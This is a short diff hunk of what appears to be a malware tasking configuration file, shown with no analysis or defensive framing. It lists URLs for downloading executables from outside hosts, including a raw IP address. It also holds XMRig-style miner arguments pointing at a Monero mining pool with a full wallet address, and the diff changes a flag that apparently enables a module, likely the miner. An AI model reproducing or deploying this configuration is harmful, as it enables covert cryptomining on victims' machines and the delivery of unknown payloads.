@@ -35,7 +35,7 @@ SWGX--http://1111.111.11/bolg/db/tvb.exe--SWGX
 -----------------------------------------------------------------------------------------------------------------------------------------
 MLB-- --donate-level 1 --max-cpu-usage 30 -o pool.supportxmr.com:5555 -u 48s91TbR4MzY1HTgQccX7jBLcnhCJpxwbdFR5MBmbxddGwjzhFcarrbgK8pzgqeTzXQMCyUjqkxTdeaSQ3qkvP5n8asfrwk.98k -p x -k--MLB
 
-MLON--O1N--MLON
+MLON--ON--MLON
 --------------------------------------------------------------------------------------------------------------------------------------
 YCKZ--ON--YCKZ
 WJDZ--http://117.50.49.3/9992.exe--WJDZ
